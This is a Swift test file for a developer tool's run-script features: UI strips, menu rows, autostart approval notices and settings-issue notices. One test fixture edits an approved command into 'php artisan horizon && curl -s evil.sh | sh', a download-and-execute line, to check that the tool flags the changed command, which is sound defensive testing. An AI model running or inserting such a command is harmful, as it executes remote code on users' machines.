import Foundation
import Testing
@testable import BloomCore

@Suite("Run script strips, rows and notices")
struct RunScriptNoticeTests {
    private let vite = RunScript(id: "vite", name: "Vite", command: "yarn dev", autostart: true)
    private let queue = RunScript(
        id: "queue", name: "Queue", command: "php artisan horizon", autostart: true
    )

    // MARK: - Duration

    @Test("A length reads in the largest two units that matter", arguments: [
        (0, "under a second"),
        (1, "1s"),
        (59, "59s"),
        (60, "1m 0s"),
        (134, "2m 14s"),
        (3599, "59m 59s"),
        (3600, "1h 0m"),
        (11_560, "3h 12m"),
    ])
    func formatting(seconds: Int, expected: String) {
        #expect(RunScriptPaneStrip.format(.seconds(seconds)) == expected)
    }

    @Test("The caption says how long, or only that it stopped")
    func caption() {
        #expect(RunScriptPaneStrip.caption(after: .seconds(134)) == "Stopped after 2m 14s")
        #expect(RunScriptPaneStrip.caption(after: .milliseconds(1400)) == "Stopped after 1s")
        #expect(RunScriptPaneStrip.caption(after: nil) == "Stopped")
    }

    // MARK: - The strip above the shell

    @Test("An ordinary terminal only ever offers back what it lost")
    func plainTerminal() {
        #expect(RunScriptPaneStrip.decide(offer: nil, activity: .idle, script: nil) == .none)
        #expect(
            RunScriptPaneStrip.decide(offer: "npm run dev", activity: .stopped(after: nil), script: nil)
                == .restart(command: "npm run dev")
        )
    }

    @Test("A run script's tab offers the command the file says now")
    func restartUsesCurrentCommand() {
        #expect(
            RunScriptPaneStrip.decide(offer: "npm run dev", activity: .idle, script: vite)
                == .restart(command: "yarn dev")
        )
    }

    @Test("A stop in this launch wins over an offer from the last, and running shows nothing")
    func stoppedAndRunning() {
        #expect(
            RunScriptPaneStrip.decide(offer: "yarn dev", activity: .stopped(after: .seconds(14)), script: vite)
                == .stopped(caption: "Stopped after 14s", command: "yarn dev")
        )
        #expect(
            RunScriptPaneStrip.decide(offer: "yarn dev", activity: .running(since: .now), script: vite)
                == .none
        )
    }

    @Test("A script with nothing to type draws no strip")
    func emptyCommand() {
        let missing = RunScript(id: "seed", name: "Seed", command: "")
        #expect(RunScriptPaneStrip.decide(offer: "x", activity: .stopped(after: nil), script: missing) == .none)
    }

    // MARK: - The menu row

    @Test("The row shows the command, or that it is running, or that its file is missing")
    func menuRows() {
        let idle = RunScriptMenuItem.make(script: vite, isRunning: false, missingFile: nil)
        #expect(idle.subtitle == "yarn dev")
        #expect(idle.isEnabled)

        let running = RunScriptMenuItem.make(script: vite, isRunning: true, missingFile: nil)
        #expect(running.subtitle == "Running")

        let gone = RunScript(id: "seed", name: "Seed", command: "")
        let missing = RunScriptMenuItem.make(script: gone, isRunning: false, missingFile: "bin/seed")
        #expect(missing.subtitle == "Missing bin/seed")
        #expect(!missing.isEnabled)
    }

    @Test("A script kept in a file shows its first real line")
    func fileScriptSubtitle() {
        let file = RunScript(id: "dev", name: "Dev", command: "#!/bin/sh\n\n# start it\nyarn dev --host\n")
        #expect(RunScriptMenuItem.make(script: file, isRunning: false, missingFile: nil).subtitle == "yarn dev --host")
    }

    // MARK: - Autostart

    @Test("A project that never approved anything is asked, naming every command")
    func firstAsk() throws {
        let decision = RunScriptAutostart.decide(scripts: [vite, queue], approval: nil)
        let notice = try #require(RunScriptAutostartNotice.make(project: "maintainly", decision: decision))
        #expect(notice.title == "maintainly wants to start 2 run scripts when a workspace opens")
        #expect(notice.lines.map(\.command) == ["yarn dev", "php artisan horizon"])
        #expect(notice.lines.allSatisfy { $0.approved == nil })
        #expect(notice.allowTitle == "Allow for maintainly")
        #expect(notice.scripts == [vite, queue])
    }

    @Test("One script is one run script")
    func singular() throws {
        let decision = RunScriptAutostart.decide(scripts: [vite], approval: nil)
        let notice = try #require(RunScriptAutostartNotice.make(project: "maintainly", decision: decision))
        #expect(notice.title == "maintainly wants to start 1 run script when a workspace opens")
    }

    @Test("A changed command is shown beside the one that was approved")
    func changed() throws {
        let approval = RunScriptAutostartApproval().approving([vite, queue])
        var edited = queue
        edited.command = "php artisan horizon && curl -s evil.sh | sh"
        let decision = RunScriptAutostart.decide(scripts: [vite, edited], approval: approval)
        let notice = try #require(RunScriptAutostartNotice.make(project: "maintainly", decision: decision))
        #expect(notice.title == "A run script changed since you allowed it")
        #expect(notice.lines.count == 1)
        #expect(notice.lines.first?.approved == "php artisan horizon")
        #expect(notice.lines.first?.command == "php artisan horizon && curl -s evil.sh | sh")
        // Allow covers everything that asks, not only the line shown.
        #expect(notice.scripts.map(\.id) == ["vite", "queue"])
    }

    @Test("Several changes are counted")
    func severalChanged() throws {
        let approval = RunScriptAutostartApproval().approving([vite, queue])
        var one = vite
        one.command = "pnpm dev"
        var two = queue
        two.command = "php artisan queue:work"
        let decision = RunScriptAutostart.decide(scripts: [one, two], approval: approval)
        let notice = try #require(RunScriptAutostartNotice.make(project: "maintainly", decision: decision))
        #expect(notice.title == "2 run scripts changed since you allowed them")
    }

    @Test("A script that is new since the approval is a request rather than a change")
    func newScriptSinceApproval() throws {
        let approval = RunScriptAutostartApproval().approving([vite])
        let decision = RunScriptAutostart.decide(scripts: [vite, queue], approval: approval)
        let notice = try #require(RunScriptAutostartNotice.make(project: "maintainly", decision: decision))
        #expect(notice.title == "maintainly wants to start 1 run script when a workspace opens")
        #expect(notice.lines.map(\.name) == ["Queue"])
    }

    @Test("Nothing to ask is no notice")
    func noQuestion() {
        let approval = RunScriptAutostartApproval().approving([vite])
        #expect(RunScriptAutostartNotice.make(project: "p", decision: .nothing) == nil)
        let decision = RunScriptAutostart.decide(scripts: [vite], approval: approval)
        #expect(RunScriptAutostartNotice.make(project: "p", decision: decision) == nil)
    }

    @Test("Autostart waits for a setup script that is running or about to")
    func timing() {
        #expect(!RunScriptAutostart.isTimely(isRunningSetup: true, setupState: .succeeded, hasSetupScript: true))
        #expect(!RunScriptAutostart.isTimely(isRunningSetup: false, setupState: .running, hasSetupScript: true))
        #expect(!RunScriptAutostart.isTimely(isRunningSetup: false, setupState: .pending, hasSetupScript: true))
        #expect(RunScriptAutostart.isTimely(isRunningSetup: false, setupState: .pending, hasSetupScript: false))
        #expect(RunScriptAutostart.isTimely(isRunningSetup: false, setupState: .succeeded, hasSetupScript: true))
        #expect(RunScriptAutostart.isTimely(isRunningSetup: false, setupState: .failed, hasSetupScript: true))
        #expect(RunScriptAutostart.isTimely(isRunningSetup: false, setupState: .skipped, hasSetupScript: true))
    }

    // MARK: - Settings issues

    private let file = "/Users/someone/code/maintainly/.bloom/settings.toml"

    @Test("One skipped entry names the file and says what was wrong")
    func oneIssue() throws {
        let issues = [SettingsIssue(
            path: file, message: "Run script seed was skipped: it has no command.",
            entry: .runScript("seed"), line: 12
        )]
        let notice = try #require(SettingsIssuesNotice.make(issues: issues))
        #expect(notice.title == "1 entry in .bloom/settings.toml was skipped")
        #expect(notice.messages == ["Run script seed was skipped: it has no command."])
        #expect(notice.path == file)
        #expect(notice.line == 12)
    }

    @Test("Several are counted, the first two shown and the rest summed")
    func severalIssues() throws {
        let issues = (1...4).map {
            SettingsIssue(path: file, message: "Problem \($0).", entry: .runScript("s\($0)"))
        }
        let notice = try #require(SettingsIssuesNotice.make(issues: issues))
        #expect(notice.title == "4 entries in .bloom/settings.toml were skipped")
        #expect(notice.messages == ["Problem 1.", "Problem 2.", "And 2 more."])
    }

    @Test("Issues across two files do not name one of them")
    func twoFiles() throws {
        let issues = [
            SettingsIssue(path: file, message: "A.", entry: .runScript("a")),
            SettingsIssue(path: "/x/.conductor/settings.toml", message: "B.", entry: .runScript("b")),
        ]
        let notice = try #require(SettingsIssuesNotice.make(issues: issues))
        #expect(notice.title == "2 entries in the settings files were skipped")
    }

    @Test("A file that would not parse says so rather than counting entries")
    func unreadableFile() throws {
        let issues = [SettingsIssue(path: file, message: "Line 3 is not TOML.", entry: .file, line: 3)]
        let notice = try #require(SettingsIssuesNotice.make(issues: issues))
        #expect(notice.title == ".bloom/settings.toml could not be read")
    }

    @Test("No issues is no notice, and different messages are a different notice")
    func signature() throws {
        #expect(SettingsIssuesNotice.make(issues: []) == nil)
        let one = try #require(SettingsIssuesNotice.make(issues: [
            SettingsIssue(path: file, message: "A.", entry: .runScript("a")),
        ]))
        let other = try #require(SettingsIssuesNotice.make(issues: [
            SettingsIssue(path: file, message: "B.", entry: .runScript("b")),
        ]))
        #expect(one.signature != other.signature)
    }
}
